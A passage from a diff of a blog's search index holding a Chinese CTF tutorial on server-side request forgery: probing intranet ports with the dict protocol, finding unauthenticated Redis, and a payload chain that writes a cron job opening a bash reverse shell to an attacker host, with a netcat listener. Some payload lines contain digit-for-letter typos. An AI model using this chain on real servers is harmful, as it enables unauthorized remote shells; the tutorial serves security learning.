-<li>&#x2F;etc&#x2F;hosts:在linux中，主要作用是定义IP地址和主机名的映射关系，是一个映射IP地址和主机名的规定。可以用文本文件打开!当用户在浏览器中输入一个网址时，系统会首先自动从hosts文件中寻找对应的IP地址，一旦找到，浏览器会立即打开对应网页，如果没有找到，则浏览器会将网址提交DNS服务器进行IP地址解析。</li>
-</ol>
-<h3 id="2-探测内网服务"><a href="#2-探测内网服务" class="headerlink" title="2. 探测内网服务"></a>2. 探测内网服务</h3><p>**dict协议:**一个字典服务器协议，在ssrf中常用于探测日标服务器端口上运行的服务版本信息。格式:dict:&#x2F;&#x2F;ip:port。先利用file协议读取&#x2F;etc&#x2F;hosts获取ip，通过 dict 协议读取目标服务器端口上运行的服务版本信息</p>
-<p>探测内网存活IP和开放端口:可利用BurpSuite，批量探测存活IP和开放端口。</p>
-<ol>
-<li><p>开启Burpsuite，并访问待测试的网站:<a class="link"   href="http://120.27.61.239:8006/source/index.php" >http://120.27.61.239:8006/source/index.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>;</p>
-</li>
-<li><p>将抓到的包发送到Intruder模块，设置IP或者端口，进行爆破;</p>
-</li>
-</ol>
-<p><strong>探测内网redis：</strong>REmote Dlctionary Server(Redis)是一个由 Salvatore Sanfilippo 写的 key-value 存储系统，是跨平台的非关系型数据库。Redis一般绑定在本地(不允许远程访问)，默认不开启认证，默认端口为6379。如果在没有开启认证的情况下，可以导致任意用户利用ssrf漏洞攻击内网中的未授权Redis以及读取Redis的数据。使用dict:&#x2F;&#x2F;127.0.0.1:6379 有返回信息，说明存在redis数据库</p>
-<p>同样可以利用Burp进行爆破</p>
-<h3 id="3-攻击内网应用"><a href="#3-攻击内网应用" class="headerlink" title="3. 攻击内网应用"></a>3. 攻击内网应用</h3><p>攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，如果运行redis 的用户是root 用户，攻击者可以通过写<strong>定时任务</strong>的方式进行反弹shell。<br>定时任务类似日常生活之中的闹钟，主要用于定时执行某些命令，达到定时处理数据的作用。不同的系统定时任务保存位置不一样，比如:<br>centos(cat &#x2F;etc&#x2F;redhat-release)，在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;日录下;<br>ubuntu(cat &#x2F;etc&#x2F;lsb-release)，在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 目录下。</p>
-<p><strong>攻击payload:</strong></p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dict://127.0.0.1:6379/info //查看信息</span><br><span class="line">dict://127.0.0.1:6379/flusha11 //清空数据库(慎用)</span><br><span class="line">dict://127.0.0.1:6379/config set dir /var/spoo1/cron/ //设置工作目录</span><br><span class="line">dict://127.0.0.1:6379/config set dbfilename root //设置备份文件名</span><br><span class="line">dict://127.0.0.1:6379/set x &quot;\n***** bash -i &amp;&gt; /dev/tcp/攻击机IP/port 0&gt;&amp;1\n&quot;//反弹she11</span><br><span class="line">dict://127.0.0.1:6379/save</span><br></pre></td></tr></table></figure></div>
-
-<p>然后攻击机进行监听</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure></div>
-
-<p>定时任务执行后就会反弹shell到攻击机</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>SSRF</tag>
       </tags>
   </entry>
 </search>
